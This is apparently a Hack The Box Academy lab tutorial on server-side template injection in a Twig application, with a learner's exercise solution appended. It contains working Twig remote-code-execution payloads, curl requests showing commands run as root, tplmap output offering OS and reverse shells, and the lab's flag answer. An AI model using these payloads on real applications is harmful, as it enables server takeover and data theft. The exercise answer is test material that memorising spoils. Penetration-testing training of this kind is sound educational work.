# SSTI Exploitation Example 1

Suppose that we are pentesting an internet-facing application (the target can be spawned at the end of this section). Our focus will be on identifying if the application is vulnerable to Server-Side Template Injection.

Navigate to the end of this section and click on `Click here to spawn the target system!`, then use the provided Pwnbox or a local VM to follow along. If you browse the target, you will come across the application below.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig1.png)

Let us submit on the input field mathematical expressions in curly brackets, such as the ones mentioned on the `SSTI Identification` section, starting with `{7*7}`.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig2.png)

It doesn't look like the application evaluated the submitted expression. Let us continue with another expression, `${7*7}` this time.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig3.png)

It doesn't look like the application evaluated this expression either. What about `{{7*7}}`?

![image](https://academy.hackthebox.com/storage/modules/145/img/twig6.png)

Luckily this time, the application evaluated the latest mathematical expression we submitted and returned the result, 49. It looks like we may be dealing with an SSTI vulnerability!

As already mentioned, the first thing we need to do when dealing with SSTI vulnerabilities is to identify the template engine the application is utilizing. Let's use PortSwigger's diagram to assist us (shown in the previous section). We already know that the `{{7*7}}` expression was evaluated successfully. The next expression the diagram suggests trying is `{{7*'7'}}`. Let us try it and see how the application responds.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig\_.png)

The application successfully evaluated this expression as well. According to PortSwigger's diagram, we are dealing with either a Jinja2 or a Twig template engine.

There are template engine-specific payloads that we can use to determine which of the two is being utilized. Let us try with the below Twig-specific one:

Code: php

```php
{{_self.env.display("TEST")}}
```

![image](https://academy.hackthebox.com/storage/modules/145/img/twig7.png)

The Twig-specific payload was evaluated successfully. A Twig template engine is being utilized on the backend. For an extensive list of template engine-specific payloads, please refer to the following resources:

* [PayloadsAllTheThings - Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
* [HackTricks - SSTI (Server Side Template Injection)](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

We could have automated the template engine identification process we just executed through [tplmap](https://github.com/epinna/tplmap), as follows. If you didn't notice, the user's input is submitted via the `name` parameter and through a POST request (hence the `-d` parameter in `tplmap`).

**tplmap.py**

SSTI Exploitation Example 1

```shell-session
AIceBear@htb[/htb]$ git clone https://github.com/epinna/tplmap.git
AIceBear@htb[/htb]$ cd tplmap
AIceBear@htb[/htb]$ pip install virtualenv
AIceBear@htb[/htb]$ virtualenv -p python2 venv
AIceBear@htb[/htb]$ source venv/bin/activate
AIceBear@htb[/htb]$ pip install -r requirements.txt
AIceBear@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john

[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Twig plugin is testing rendering with tag '{{*}}'
[+] Twig plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, php code

[+] Rerun tplmap providing one of the following options:

    --os-shell				Run shell on the target
    --os-cmd				Execute shell commands
    --bind-shell PORT			Connect to a shell bind to a target port
    --reverse-shell HOST PORT	Send a shell back to the attacker's port
    --upload LOCAL REMOTE	Upload files to the server
    --download REMOTE LOCAL	Download remote files
```

The next step is to gain remote code execution on the target server. Before moving the payload part, it should be mentioned that Twig has a variable `_self`, which, in simple terms, makes a few of the internal APIs public. This `_self` object has been documented, so we don't need to brute force any variable names (more on that in the next SSTI exploitation examples). Back to the remote code execution part, we can use the `getFilter` function as it allows execution of a user-defined function via the following process:

* Register a function as a filter callback via `registerUndefinedFilterCallback`
* Invoke `_self.env.getFilter()` to execute the function we have just registered

**Payload**

Code: php

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
```

Let's submit the payload using cURL this time.

**cURL - Interacting with the Target**

SSTI Exploitation Example 1

```shell-session
AIceBear@htb[/htb]$ curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}' http://<TARGET IP>:<PORT>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
"http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
<html>
<head>
  <link rel="stylesheet" type="text/css" href="css/default.css" media="screen"/>
  <title>SSTI</title>
</head>
<body>
<div class="container">
  <div class="main">
    <div class="header">
      <div class="title">
        <h1>I'm here to say hello</h1>
      </div>
    </div>
    <div class="content">
 

<a>
    Who are you?
    <form method='post' action=''>
        <div class="form-group"> 
            <input placeholder="Name" name="name" size=70></input> <button class="btn btn-default" type="submit" name='submit'>Send</button>
       </div> 
    </form>
Hello uid=0(root) gid=0(root) groups=0(root)
Linux serversideattackssstitwig-60784-78bd58b5b-pmvvv 4.19.0-17-cloud-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64 GNU/Linux
serversideattackssstitwig-60784-78bd58b5b-pmvvv
serversideattackssstitwig-60784-78bd58b5b-pmvvv!</a>

        </div>    
        <div class="clearer"><span></span></div>
    </div>
    <div class="footer">Break me!</div>
</div>
</body>
```

As we can see in the output/response above, the submitted payload was evaluated, and the specified commands (`id`, `uname -a`, and `hostname`) were executed successfully.

Again, we could have automated the template engine exploitation process we just executed through [tplmap](https://github.com/epinna/tplmap), as follows.

**tplmap.py - OS Shell**

SSTI Exploitation Example 1

```shell-session
AIceBear@htb[/htb]$ ./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell

[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'name' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin is testing blind injection
[+] Twig plugin is testing rendering with tag '{{*}}'
[+] Twig plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: name
  Engine: Twig
  Injection: {{*}}
  Context: text
  OS: Linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, php code

[+] Run commands on the operating system.

Linux $ 
```

We can now execute any command of our choosing through the shell `tplmap` established for us!

Now, proceed to this section's exercise and complete the objective either by crafting the payload yourself or through a shell obtained with the help of `tplmap`.

Note: When we notice that the mathematical expressions we submit are evaluated, the application may be vulnerable to XSS as well.

Let us test the above statement by submitting an XSS payload inside curly brackets to this section's exercise target. The result of doing so can be seen in the image below.

![image](https://academy.hackthebox.com/storage/modules/145/img/twig8.png)

**Questions**

Use what you learned in this section to obtain the flag which is hidden in the environment variables. Answer format: HTB{String}

```bash
#1
git clone https://github.com/vladko312/sstimap
./sstimap.py -u "http://83.136.252.32:30187" -f -s
#we got shells
#2
#https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
curl -X POST -d 'name={{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("printenv")}}' http://94.237.56.188:44730
HTB{IWasJustAskingForYourName}
```
